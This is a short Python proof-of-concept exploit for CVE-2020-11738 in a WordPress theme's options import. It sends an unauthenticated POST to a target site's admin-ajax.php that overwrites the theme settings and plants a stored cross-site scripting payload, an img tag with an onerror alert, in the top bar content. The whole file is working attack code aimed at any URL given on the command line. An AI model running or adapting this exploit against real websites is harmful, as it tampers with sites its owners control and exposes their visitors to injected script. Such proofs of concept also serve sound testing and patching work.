import requests
import argparse

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2020-11738 PoC")
    parser.add_argument("-u", help = "url of the website, eg: http://wordpress.local/", required=True)
    args = parser.parse_args()

    try:
        payload = """action=onetone_options_import&options={"top_bar_info_content":"<img+src=x+onerror='alert(\\"xss\\")'+/>","header_social_icons":[],"page_title_bar_background1":{"background-color":"","background-image":"","background-repeat":"","background-position":"top-left","background-size":"","background-attachment":""},"page_title_bar_retina_background1":{"background-color":"","background-image":"","background-repeat":"","background-position":"top-left","background-size":"","background-attachment":""},"footer_background":{"background-color":"","background-image":"","background-repeat":"","background-position":"","background-size":"","background-attachment":""},"footer_social_icons":[],"header_background":{"background-color":"#ffffff","background-image":"","background-repeat":"","background-position":"top-left","background-size":"","background-attachment":""},"custom_fonts":[],"display_top_bar":"yes"}"""
        headers = {
            "Content-Type":"application/x-www-form-urlencoded"
        }
        #r = requests.post(args.u+"/wp-admin/admin-ajax.php", data=payload, headers=headers, proxies=proxies)
        r = requests.post(args.u+"/wp-admin/admin-ajax.php", data=payload, headers=headers)
        print(r.text)
    except requests.exceptions.RequestException as e:
        print(e)
